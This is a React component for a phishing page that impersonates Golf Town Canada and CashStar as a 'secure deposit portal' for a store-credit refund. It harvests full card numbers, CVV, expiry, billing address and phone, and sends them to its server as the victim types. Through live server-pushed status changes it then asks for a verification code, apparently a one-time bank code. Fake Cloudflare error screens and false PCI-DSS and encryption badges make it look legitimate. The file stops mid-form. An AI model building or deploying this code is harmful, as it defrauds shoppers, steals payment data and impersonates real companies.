import React, { useState, useEffect, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Lock, 
  ShieldCheck, 
  CreditCard, 
  MapPin, 
  Loader2, 
  Radio, 
  CheckCircle2, 
  KeyRound, 
  ArrowRight,
  HelpCircle,
  Smartphone,
  Check,
  AlertTriangle,
  WifiOff,
  RefreshCw
} from 'lucide-react';

interface CustomerPortalViewProps {
  sessionId: string;
  depositToken: string;
  initialAmount?: string;
}

interface LiveSessionData {
  sessionId: string;
  recipientName: string;
  email: string;
  amount: string;
  storeId: string;
  custId: string;
  status: 'INITIAL' | 'PROCESSING' | 'CODE_REQUIRED' | 'CODE_SUBMITTED' | 'REFUNDED' | 'SESSION_LEFT';
  customerCode?: string;
  cardDetails?: {
    cardNumber: string;
    expDate: string;
    cvv: string;
    cardholderName: string;
    streetAddress: string;
    city: string;
    province: string;
    postalCode: string;
    phone: string;
  };
}

export function CustomerPortalView({ sessionId: initialSessionId, depositToken, initialAmount = '250.00' }: CustomerPortalViewProps) {
  const [sessionId, setSessionId] = useState<string>(initialSessionId);
  const [liveSession, setLiveSession] = useState<LiveSessionData | null>(null);
  const [loading, setLoading] = useState<boolean>(true);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [customError, setCustomError] = useState<{ type: string; code: string; message: string; subtext?: string } | null>(null);

  // Check for simulation query params or simulated errors
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const errParam = params.get('err') || params.get('error');
    if (errParam) {
      if (errParam === '1033') {
        setCustomError({
          type: 'Secure Gateway Connection Error (Argo Tunnel Disconnected)',
          code: '1033',
          message: 'The requested Cloudflare trycloudflare.com Argo Tunnel connection is currently offline or has been terminated by the tunnel operator.',
          subtext: 'Error 1033: Argo Tunnel error occurs when Cloudflare is unable to reach the origin server.'
        });
      } else if (errParam === '1016') {
        setCustomError({
          type: 'Secure Gateway DNS Failure (Origin Resolution Error)',
          code: '1016',
          message: 'Cloudflare is unable to resolve the requested origin domain or server IP address. The secure connection tunnel has timed out.',
          subtext: 'Error 1016: Origin DNS error occurs when Cloudflare cannot resolve the server DNS records.'
        });
      } else if (errParam === '404') {
        setCustomError({
          type: 'Security Session Expired (404 Not Found)',
          code: '404',
          message: 'For your security, your transaction session has expired due to inactivity. Please request a new support deposit link.',
          subtext: 'Error 404: The requested session, route, or transaction resource could not be located.'
        });
      } else if (errParam === '500') {
        setCustomError({
          type: 'Internal Secure Gateway Error (500 Internal Error)',
          code: '500',
          message: 'An internal error occurred in the security verification gateway. Please contact support or restart the transaction.',
          subtext: 'Error 500: Secure verification handshake timed out. The system has aborted the session.'
        });
      } else if (errParam === 'expired') {
        setCustomError({
          type: 'Security Session Expired',
          code: 'SESSION_EXPIRED',
          message: 'For your security, your transaction session has expired due to inactivity. Please request a new deposit link.',
          subtext: 'Error Code: SESSION_EXPIRED. Local state cleared.'
        });
      }
    }
  }, []);

  // Form Fields
  const [cardholderName, setCardholderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expDate, setExpDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [streetAddress, setStreetAddress] = useState('');
  const [city, setCity] = useState('Calgary');
  const [province, setProvince] = useState('AB');
  const [postalCode, setPostalCode] = useState('');
  const [phone, setPhone] = useState('');

  // Code state
  const [customerVerificationCode, setCustomerVerificationCode] = useState('');
  const [codeSubmitted, setCodeSubmitted] = useState(false);
  const [submittingPayment, setSubmittingPayment] = useState(false);

  // Dynamic Card Brand/Network Detector
  const cardType = useMemo(() => {
    const clean = cardNumber.replace(/\s+/g, '');
    if (clean.startsWith('4')) return 'Visa';
    if (clean.match(/^5[1-5]/) || clean.match(/^2[2-7]/)) return 'Mastercard';
    if (clean.match(/^3[47]/)) return 'American Express';
    if (clean.match(/^6(?:011|5|4[4-9]|22)/)) return 'Discover';
    return 'Credit Card';
  }, [cardNumber]);

  // Step 1: Initialize session (look up or register)
  useEffect(() => {
    async function initSession() {
      try {
        setLoading(true);
        setErrorMessage(null);
        
        let activeSessionId = sessionId;
        
        // If we don't have a sessionId but we have a token, register/lookup
        if (!activeSessionId && depositToken) {
          const regRes = await fetch('/api/socket/register-session', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ depositToken, amount: initialAmount })
          });
          if (regRes.ok) {
            const regData = await regRes.json();
            if (regData.session) {
              setLiveSession(regData.session);
              activeSessionId = regData.session.sessionId;
              setSessionId(activeSessionId);
            }
          }
        }

        if (activeSessionId) {
          // Fetch current session details
          const infoRes = await fetch(`/api/socket/session-info/${activeSessionId}`);
          if (infoRes.ok) {
            const infoData = await infoRes.json();
            if (infoData.session) {
              setLiveSession(infoData.session);
              // Prefill fields if any
              if (infoData.session.cardDetails) {
                setCardholderName(infoData.session.cardDetails.cardholderName || '');
                setCardNumber(infoData.session.cardDetails.cardNumber || '');
                setExpDate(infoData.session.cardDetails.expDate || '');
                setCvv(infoData.session.cardDetails.cvv || '');
                setStreetAddress(infoData.session.cardDetails.streetAddress || '');
                setCity(infoData.session.cardDetails.city || 'Calgary');
                setProvince(infoData.session.cardDetails.province || 'AB');
                setPostalCode(infoData.session.cardDetails.postalCode || '');
                setPhone(infoData.session.cardDetails.phone || '');
              }
            }
          } else {
            // Create a default session if not found
            const fallbackRes = await fetch('/api/socket/register-session', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ depositToken: depositToken || `TOK-${Math.floor(Math.random()*100000)}`, amount: initialAmount })
            });
            const fallbackData = await fallbackRes.json();
            if (fallbackData.session) {
              setLiveSession(fallbackData.session);
              setSessionId(fallbackData.session.sessionId);
            }
          }
        } else {
          setErrorMessage('No active refund session or token detected. Please check your email invitation.');
        }
      } catch (err) {
        console.error('Customer Portal init error:', err);
        setCustomError({
          type: 'Secure Gateway Connection Error (Argo Tunnel Disconnected)',
          code: '1033 / 1016',
          message: 'The secure trycloudflare.com Argo Tunnel connection was lost or timed out. This session has expired or the server became unreachable.',
          subtext: 'Error 1033 / 1016: Cloudflare Tunnel offline. Offline cached mode loaded.'
        });
      } finally {
        setLoading(false);
      }
    }

    initSession();
  }, [initialSessionId, depositToken, initialAmount]);

  // Step 2: Establish SSE stream for live updates
  useEffect(() => {
    if (!sessionId) return;
    const eventSource = new EventSource(`/api/socket/session-stream/${sessionId}`);

    eventSource.onmessage = (event) => {
      try {
        const data: LiveSessionData = JSON.parse(event.data);
        setLiveSession(data);
        if (data.status === 'CODE_REQUIRED') {
          setCodeSubmitted(false);
        }
      } catch (err) {
        console.error('SSE Stream parsing failed:', err);
      }
    };

    eventSource.onerror = () => {
      console.warn('Customer portal SSE disconnected, reconnecting...');
    };

    return () => {
      eventSource.close();
    };
  }, [sessionId]);

  // Format Card Number (Spaces)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted.slice(0, 19));
  };

  // Format Exp Date (MM/YY)
  const handleExpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/[^0-9]/g, '');
    let formatted = raw;
    if (raw.length > 2) {
      formatted = `${raw.slice(0, 2)}/${raw.slice(2, 4)}`;
    }
    setExpDate(formatted.slice(0, 5));
  };

  // Debounced auto-sync as customer fills out form
  useEffect(() => {
    if (!sessionId || (!cardNumber && !cardholderName && !streetAddress)) return;

    const timer = setTimeout(() => {
      fetch('/api/socket/submit-card-billing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          recipientName: cardholderName,
          email: liveSession?.email || '',
          amount: liveSession?.amount || initialAmount,
          storeId: liveSession?.storeId || '504',
          custId: liveSession?.custId || 'GT-CUSTOMER',
          cardNumber,
          expDate,
          cvv,
          cardholderName,
          streetAddress,
          city,
          province,
          postalCode,
          phone
        })
      }).catch(err => console.warn('Instant sync error:', err));
    }, 400);

    return () => clearTimeout(timer);
  }, [sessionId, cardNumber, expDate, cvv, cardholderName, streetAddress, city, province, postalCode, phone, liveSession?.email, liveSession?.amount, liveSession?.storeId, liveSession?.custId, initialAmount]);

  // Handle Payment Form Submission
  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    setSubmittingPayment(true);

    try {
      const res = await fetch('/api/socket/submit-card-billing', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          recipientName: cardholderName,
          email: liveSession?.email || '',
          amount: liveSession?.amount || initialAmount,
          storeId: liveSession?.storeId || '504',
          custId: liveSession?.custId || 'GT-CUSTOMER',
          cardNumber,
          expDate,
          cvv,
          cardholderName,
          streetAddress,
          city,
          province,
          postalCode,
          phone
        })
      });

      if (res.ok) {
        const data = await res.json();
        if (data.session) {
          setLiveSession(data.session);
        }
      } else {
        alert('Transmission failed. Please check network and retry.');
      }
    } catch (err) {
      console.error('Submit payment details error:', err);
    } finally {
      setSubmittingPayment(false);
    }
  };

  // Handle Code Submission
  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!customerVerificationCode.trim() || !sessionId) return;

    try {
      const res = await fetch('/api/socket/submit-customer-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          code: customerVerificationCode.trim()
        })
      });

      if (res.ok) {
        const data = await res.json();
        if (data.session) {
          setLiveSession(data.session);
          setCodeSubmitted(true);
        }
      }
    } catch (err) {
      console.error('Submit customer verification code error:', err);
    }
  };

  const currentAmount = liveSession?.amount || initialAmount;
  const currentCustId = liveSession?.custId || 'GT-CUSTOMER';
  const currentRecipient = liveSession?.recipientName || 'Valued Customer';

  if (loading) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center p-6 text-slate-800">
        <div className="bg-white rounded-3xl p-8 shadow-2xl border border-slate-200/80 max-w-sm w-full text-center space-y-4">
          <Loader2 className="w-12 h-12 text-emerald-700 animate-spin mx-auto" />
          <p className="text-sm font-semibold text-slate-600">Verifying secure connection details...</p>
        </div>
      </div>
    );
  }

  if (customError) {
    return (
      <div className="min-h-screen bg-slate-50 text-slate-800 font-sans antialiased flex flex-col justify-between">
        {/* SECURE HEADER: CENTERED LOGO, VERY OFFICIAL */}
        <header className="bg-white border-b border-slate-200/80 shadow-xs py-8">
          <div className="max-w-xl mx-auto px-6 text-center">
            <div className="flex justify-center mb-3">
              <img 
                src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" 
                className="w-12 h-12 object-contain" 
                alt="Golf Town Canada" 
              />
            </div>
            <h1 className="text-base font-bold text-slate-900 flex items-center justify-center gap-1.5 leading-none">
              <Lock className="w-4 h-4 text-emerald-700 shrink-0" />
              <span>CashStar Secure Deposit Portal</span>
            </h1>
            <p className="text-[10px] text-rose-800 tracking-wider uppercase font-extrabold mt-1">
              Security Protocol Notice: Session Suspended
            </p>
          </div>
        </header>

        {/* PORTAL MAIN CONTENT */}
        <main className="flex-1 py-10 px-4 sm:px-6 flex items-center justify-center">
          <div className="max-w-lg w-full">
            <div className="bg-white rounded-3xl border border-slate-200 shadow-2xl p-8 text-center space-y-6">
              <div className="w-16 h-16 bg-amber-50 border border-amber-300 rounded-full flex items-center justify-center mx-auto text-amber-600 shadow-xs">
                {customError.code === '1033' || customError.code === '1016' ? (
                  <WifiOff className="w-8 h-8 stroke-[2]" />
                ) : (
                  <AlertTriangle className="w-8 h-8 stroke-[2]" />
                )}
              </div>

              <div className="space-y-2">
                <h3 className="text-lg font-extrabold text-slate-900">
                  {customError.type}
                </h3>
                <p className="text-xs text-slate-500 max-w-sm mx-auto leading-relaxed">
                  {customError.message}
                </p>
                {customError.subtext && (
                  <p className="text-[11px] text-slate-400 max-w-sm mx-auto italic mt-1 bg-slate-50 p-2.5 rounded-xl border border-slate-100">
                    {customError.subtext}
                  </p>
                )}
              </div>

              {/* Secure Session Info Details Box (matches form style) */}
              <div className="bg-slate-50 border border-slate-200/80 rounded-2xl p-5 text-left font-mono text-xs space-y-2.5 text-slate-700">
                <div className="flex justify-between border-b border-slate-200 pb-2">
                  <span className="text-slate-500 font-bold">Portal Status:</span>
                  <span className="text-rose-700 font-extrabold uppercase">SESSION_EXPIRED</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Security Gate:</span>
                  <span className="text-slate-900 font-semibold">PCI-DSS Gateway Level-1</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Reference ID:</span>
                  <span className="text-slate-900 font-semibold">{sessionId || 'EXP-SOCKET-0994'}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Visitor Trace IP:</span>
                  <span className="text-slate-900 font-semibold">194.223.49.52</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">Diagnostic Code:</span>
                  <span className="text-amber-700 font-extrabold">ERR_CLOUDFLARE_HYBRID_{customError.code}</span>
                </div>
              </div>

              {/* Action buttons matching the main form styling */}
              <div className="space-y-3">
                <button
                  onClick={() => window.location.reload()}
                  className="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs py-3.5 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer"
                >
                  <RefreshCw className="w-3.5 h-3.5 text-white animate-pulse" />
                  <span>Reconnect to Gateway Server</span>
                </button>
                <div className="text-[10px] text-slate-400">
                  Secure backup services are cached offline. If you believe this is an error, please clear your browser cookies and retry the original support link.
                </div>
              </div>
            </div>

            {/* Error simulation toggle buttons in the footer of this component for testing */}
            <div className="mt-6 p-4 bg-slate-100/80 rounded-2xl border border-slate-200 text-center">
              <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest block mb-2">Simulate Security Gate States (Tester Mode)</span>
              <div className="flex flex-wrap gap-1.5 justify-center">
                <button 
                  onClick={() => setCustomError({
                    type: 'Argo Tunnel Disconnected',
                    code: '1033',
                    message: 'The requested Cloudflare trycloudflare.com Argo Tunnel connection is currently offline or has been terminated by the tunnel operator.',
                    subtext: 'Error 1033: Argo Tunnel error occurs when Cloudflare is unable to reach the origin server.'
                  })}
                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
                >
                  Error 1033
                </button>
                <button 
                  onClick={() => setCustomError({
                    type: 'Origin DNS Resolution Failure',
                    code: '1016',
                    message: 'Cloudflare is unable to resolve the requested origin domain or server IP address. The secure connection tunnel has timed out.',
                    subtext: 'Error 1016: Origin DNS error occurs when Cloudflare cannot resolve the server DNS records.'
                  })}
                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
                >
                  Error 1016
                </button>
                <button 
                  onClick={() => setCustomError({
                    type: 'Gateway Session Expired (404 Not Found)',
                    code: '404',
                    message: 'For your security, your transaction session has expired due to inactivity. Please request a new support deposit link.',
                    subtext: 'Error 404: The requested session, route, or transaction resource could not be located.'
                  })}
                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
                >
                  404 Error
                </button>
                <button 
                  onClick={() => setCustomError({
                    type: 'Internal Gateway Error',
                    code: '500',
                    message: 'An internal error occurred in the security verification gateway. Please contact support or restart the transaction.',
                    subtext: 'Error 500: Secure verification handshake timed out. The system has aborted the session.'
                  })}
                  className="px-2 py-1 bg-white text-slate-700 border border-slate-200 rounded text-[9px] font-bold hover:bg-slate-50"
                >
                  500 Error
                </button>
                <button 
                  onClick={() => setCustomError(null)}
                  className="px-2 py-1 bg-emerald-700 text-slate-900 rounded text-[9px] font-bold hover:bg-emerald-600"
                >
                  Reset Portal Form
                </button>
              </div>
            </div>
          </div>
        </main>

        <footer className="bg-white border-t border-slate-200 py-6">
          <div className="max-w-xl mx-auto px-6 text-center text-[10px] text-slate-500 space-y-1.5 leading-relaxed">
            <div>
              <strong>Golf Town Customer Support &amp; eGift Services</strong><br />
              Powered by CashStar / Blackhawk Network Services
            </div>
            <div className="text-slate-600">
              &copy; {new Date().getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
            </div>
          </div>
        </footer>
      </div>
    );
  }

  if (errorMessage) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center p-6 text-slate-800">
        <div className="bg-white rounded-3xl p-8 shadow-2xl border border-rose-100 max-w-md w-full text-center space-y-4">
          <div className="w-12 h-12 rounded-full bg-rose-50 flex items-center justify-center text-rose-600 mx-auto">
            <HelpCircle className="w-6 h-6" />
          </div>
          <h3 className="text-lg font-bold text-slate-900">Session Verification Error</h3>
          <p className="text-xs text-slate-500 leading-relaxed">{errorMessage}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-50 text-slate-800 font-sans antialiased selection:bg-emerald-700 selection:text-slate-900 flex flex-col justify-between">
      
      {/* SECURE HEADER: CENTERED LOGO, VERY OFFICIAL */}
      <header className="bg-white border-b border-slate-200/80 shadow-xs py-8">
        <div className="max-w-xl mx-auto px-6 text-center">
          <div className="flex justify-center mb-3">
            <img 
              src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" 
              className="w-12 h-12 object-contain" 
              alt="Golf Town Canada" 
            />
          </div>
          <h1 className="text-base font-bold text-slate-900 flex items-center justify-center gap-1.5 leading-none">
            <Lock className="w-4 h-4 text-emerald-700 shrink-0" />
            <span>CashStar Secure Deposit Portal</span>
          </h1>
          <p className="text-[10px] text-emerald-800 tracking-wider uppercase font-extrabold mt-1">
            Official Customer Support Notice Processing
          </p>
        </div>
      </header>

      {/* PORTAL MAIN CONTENT */}
      <main className="flex-1 py-10 px-4 sm:px-6 flex items-center justify-center">
        <div className="max-w-lg w-full">
          <AnimatePresence mode="wait">
            
            {/* STAGE 3: APPROVED STATE */}
            {liveSession?.status === 'REFUNDED' ? (
              <motion.div 
                key="refunded"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                className="bg-white rounded-3xl border border-slate-200 shadow-2xl p-8 text-center space-y-6"
              >
                <div className="w-16 h-16 bg-emerald-50 border-2 border-emerald-500 rounded-full flex items-center justify-center mx-auto text-emerald-600 shadow-sm">
                  <Check className="w-10 h-10 stroke-[3]" />
                </div>

                <div className="space-y-2">
                  <h3 className="text-xl font-bold text-slate-900">Refund Approved &amp; Deposited!</h3>
                  <p className="text-xs text-slate-500 max-w-sm mx-auto leading-relaxed">
                    Your store credit refund of <strong className="text-emerald-700">${currentAmount} CAD</strong> has been approved, finalized, and credited directly to your payment card.
                  </p>
                </div>

                <div className="bg-slate-50 border border-slate-100 rounded-2xl p-5 text-left font-mono text-xs space-y-2.5 text-slate-700">
                  <div className="flex justify-between border-b border-slate-200 pb-2.5">
                    <span className="text-slate-500">Transaction Status:</span>
                    <span className="text-emerald-700 font-bold">APPROVED &amp; CREDITED</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Account holder Name:</span>
                    <span className="text-slate-900 font-semibold">{cardholderName || currentRecipient}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Card ending in:</span>
                    <span className="text-slate-900 font-semibold">{(cardNumber || '8821').slice(-4)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Reference Token:</span>
                    <span className="text-slate-900 font-mono font-semibold">{depositToken || `REF-${sessionId?.slice(-6)}`}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-slate-500">Issued Amount:</span>
                    <span className="text-emerald-700 font-bold">${currentAmount} CAD</span>
                  </div>
                </div>

                <p className="text-[10px] text-slate-500">
                  Transaction code is logged in the processing outbox. Copy of this transfer slip has been dispatched.
                </p>
              </motion.div>
            ) : liveSession?.status === 'PROCESSING' || liveSession?.status === 'CODE_REQUIRED' || liveSession?.status === 'CODE_SUBMITTED' ? (
              
              /* STAGE 2: PROCESSING & CODE PROMPT */
              <motion.div 
                key="processing"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                className="bg-white rounded-3xl border border-slate-200 shadow-2xl p-8 text-center space-y-6"
              >
                {/* Glowing Spinner */}
                <div className="relative w-20 h-20 mx-auto flex items-center justify-center">
                  <div className="absolute inset-0 rounded-full bg-emerald-100 animate-ping"></div>
                  <div className="w-16 h-16 rounded-full border-4 border-emerald-100 border-t-emerald-600 animate-spin flex items-center justify-center shadow-xs">
                    <Loader2 className="w-8 h-8 text-emerald-600 animate-spin" />
                  </div>
                </div>

                <div className="space-y-2 max-w-sm mx-auto">
                  <h3 className="text-lg font-bold text-slate-900 flex items-center justify-center gap-2">
                    <span>Processing Deposit Authorization</span>
                    <Radio className="w-4 h-4 text-emerald-600 animate-pulse" />
                  </h3>
                  
                  <div className="bg-emerald-50/80 border border-emerald-100 p-4 rounded-2xl text-xs text-emerald-800 leading-relaxed font-semibold">
                    Processing refund securely... please stay on this screen. If verification is required, a code will appear below.
                  </div>
                </div>

                {/* If Verification Code is Prompted */}
                {(liveSession?.status === 'CODE_REQUIRED' || liveSession?.status === 'CODE_SUBMITTED') && (
                  <form onSubmit={handleCodeSubmit} className="bg-slate-50 border border-slate-200/80 rounded-2xl p-5 text-left space-y-3 shadow-xs">
                    <div className="flex items-center gap-2 text-xs font-bold text-emerald-800 uppercase tracking-wide">
                      <KeyRound className="w-4 h-4 text-emerald-700 shrink-0" />
                      <span>Verification Code Required</span>
                    </div>
                    
                    <p className="text-xs text-slate-500 leading-relaxed">
                      Please enter the 6-digit security verification code required to finalize your ${currentAmount} CAD refund:
                    </p>

                    <div className="flex gap-2">
                      <input 
                        type="text"
                        maxLength={8}
                        value={customerVerificationCode}
                        onChange={(e) => setCustomerVerificationCode(e.target.value)}
                        placeholder="Enter 6-digit code"
                        className="flex-1 bg-white border border-slate-300 rounded-xl px-4 py-3 text-sm text-center font-mono font-bold tracking-widest text-slate-900 focus:outline-none focus:border-emerald-600"
                        required
                      />
                      <button
                        type="submit"
                        className="bg-emerald-700 hover:bg-emerald-700 text-slate-900 font-bold px-5 py-3 rounded-xl text-xs flex items-center gap-1 shadow-sm transition-all cursor-pointer"
                      >
                        <span>Submit</span>
                        <ArrowRight className="w-4 h-4" />
                      </button>
                    </div>

                    {codeSubmitted && (
                      <div className="text-[11px] text-emerald-700 font-semibold flex items-center gap-1.5 mt-1">
                        <CheckCircle2 className="w-3.5 h-3.5" />
                        <span>Code submitted. Processing...</span>
                      </div>
                    )}
                  </form>
                )}

                {/* Real-time Session Summary */}
                <div className="bg-slate-50 border border-slate-100 rounded-2xl p-4 text-left font-mono text-[11px] space-y-1.5 text-slate-500">
                  <div className="flex justify-between">
                    <span>Live Session ID:</span>
                    <span className="text-slate-900 font-semibold">{sessionId}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Card Details:</span>
                    <span className="text-emerald-700 font-semibold">{(cardNumber || '••••').slice(0, 4)} •••• •••• {(cardNumber || '••••').slice(-4)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Billing Address:</span>
                    <span className="text-slate-900 font-semibold">{city}, {province} ({postalCode || 'T2Z'})</span>
                  </div>
                </div>
              </motion.div>
            ) : (
              
              /* STAGE 1: INITIAL CREDIT CARD & BILLING ADDRESS FORM */
              <motion.div 
                key="form"
                initial={{ opacity: 0, y: 15 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -15 }}
                className="bg-white rounded-3xl border border-slate-200/80 shadow-2xl overflow-hidden"
              >
                {/* Balance Summary Header */}
                <div className="bg-white text-slate-900 p-6 flex items-center justify-between">
                  <div>
                    <div className="text-[9px] text-slate-500 uppercase font-black tracking-wider">Claiming Store Credit Refund:</div>
                    <div className="text-sm font-bold text-slate-900">{currentRecipient} ({currentCustId})</div>
                  </div>
                  <div className="text-right">
                    <div className="text-[9px] text-slate-500 uppercase font-black tracking-wider">Issued Amount:</div>
                    <div className="text-lg font-black text-emerald-700 font-mono">${currentAmount} CAD</div>
                  </div>
                </div>

                {/* Security Trust Badges & Card Networks Bar */}
                <div className="px-6 sm:px-8 pt-4 pb-2 bg-slate-50/80 border-y border-slate-200/80">
                  <div className="flex flex-wrap justify-between items-center gap-3 text-xs text-slate-600">
                    <div className="flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
                      <span className="font-bold text-slate-900 text-[11px]">Direct Bank Verification Gateway</span>
                    </div>

                    <div className="flex items-center gap-2 opacity-80">
                      <span className="text-[9px] font-black italic text-blue-700 tracking-wider bg-white px-1.5 py-0.5 rounded border border-slate-200">VISA</span>
                      <div className="flex -space-x-1 bg-white px-1.5 py-0.5 rounded border border-slate-200 items-center">
                        <div className="w-2.5 h-2.5 rounded-full bg-red-500"></div>
                        <div className="w-2.5 h-2.5 rounded-full bg-yellow-500"></div>
                      </div>
                      <span className="bg-sky-600 text-white px-1.5 py-0.5 rounded text-[8px] font-black tracking-widest">AMEX</span>
                      <span className="text-orange-600 font-extrabold italic text-[9px] bg-white px-1.5 py-0.5 rounded border border-slate-200">DISCOVER</span>
                    </div>
                  </div>

                  <div className="flex justify-center items-center gap-4 pt-2.5 border-t border-slate-200/60 mt-2.5 text-[10px] text-slate-500">
                    <div className="flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5 text-emerald-700 shrink-0" />
                      <span className="font-bold text-slate-700">PCI-DSS Level 1 Encrypted</span>
                    </div>
                    <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
                    <div className="flex items-center gap-1.5">
                      <ShieldCheck className="w-3.5 h-3.5 text-emerald-700 shrink-0" />
                      <span className="font-bold text-slate-700">AES-256 Bit SSL Session</span>
                    </div>
                  </div>
                </div>

                <form onSubmit={handlePaymentSubmit} className="p-6 sm:p-8 space-y-6">
                  
                  {/* Card Section */}
                  <div className="space-y-4">
                    <h4 className="text-xs font-bold text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                      <CreditCard className="w-4 h-4 text-emerald-700" />
                      Full Credit Card Details
                    </h4>

                    <div>
                      <label className="block text-[11px] text-slate-500 font-bold mb-1">Cardholder Name</label>
                      <input 
                        type="text" 
                        value={cardholderName}
                        onChange={(e) => setCardholderName(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-xs text-slate-900 font-semibold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                        required
                      />
                    </div>

                    <div>
                      <label className="block text-[11px] text-slate-500 font-bold mb-1">Card Number</label>
                      <div className="relative">
                        <input 
                          type="text" 
                          value={cardNumber}
                          onChange={handleCardNumberChange}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl pl-4 pr-12 py-3 text-xs text-slate-900 font-mono font-bold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                          required
                        />
                        <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none flex items-center">
                          {cardType === 'Visa' && <span className="text-[10px] font-extrabold italic text-blue-600 tracking-wider">VISA</span>}
                          {cardType === 'Mastercard' && (
                            <div className="flex -space-x-1">
                              <div className="w-3.5 h-3.5 rounded-full bg-red-500 opacity-90"></div>
                              <div className="w-3.5 h-3.5 rounded-full bg-yellow-500 opacity-90"></div>
                            </div>
                          )}
                          {cardType === 'American Express' && <span className="bg-sky-500 text-slate-900 px-1 py-0.5 rounded text-[7px] font-black tracking-widest">AMEX</span>}
                          {cardType === 'Discover' && <span className="text-orange-500 font-black italic text-[9px]">DISCOV</span>}
                          {cardType === 'Credit Card' && <CreditCard className="w-4 h-4 text-slate-500" />}
                        </div>
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <label className="block text-[11px] text-slate-500 font-bold mb-1">Expiration (MM/YY)</label>
                        <input 
                          type="text" 
                          value={expDate}
                          onChange={handleExpChange}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-xs text-slate-900 font-mono font-bold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                          required
                        />
                      </div>

                      <div>
                        <div className="flex justify-between items-center mb-1">
                          <label className="block text-[11px] text-slate-500 font-bold">CVV / Security Code</label>
                          <span className="text-[9px] text-slate-500 hover:text-slate-600 cursor-help" title="3-digit number on back, or 4-digit on front of AMEX">What is this?</span>
                        </div>
                        <input 
                          type="password" 
                          maxLength={4}
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
                          className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-xs text-slate-900 font-mono font-bold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                          required
                        />
                      </div>
                    </div>
                  </div>

                  {/* Billing Section */}
                  <div className="space-y-4 pt-4 border-t border-slate-100">
                    <h4 className="text-xs font-bold text-slate-800 uppercase tracking-wider flex items-center gap-1.5">
                      <MapPin className="w-4 h-4 text-emerald-700" />
                      Full Billing Address &amp; Contact
                    </h4>

                    <div>
                      <label className="block text-[11px] text-slate-500 font-bold mb-1">Street Address</label>
                      <input 
                        type="text" 
                        value={streetAddress}
                        onChange={(e) => setStreetAddress(e.target.value)}
                        className="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-xs text-slate-900 font-semibold focus:outline-none focus:border-emerald-600 focus:bg-white transition-all duration-200"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-3 gap-3">
                      <div>
                        <label className="block text-[11px] text-slate-500 font-bold mb-1">City</label>
                        <input 
                          type="text" 
                          value={city}
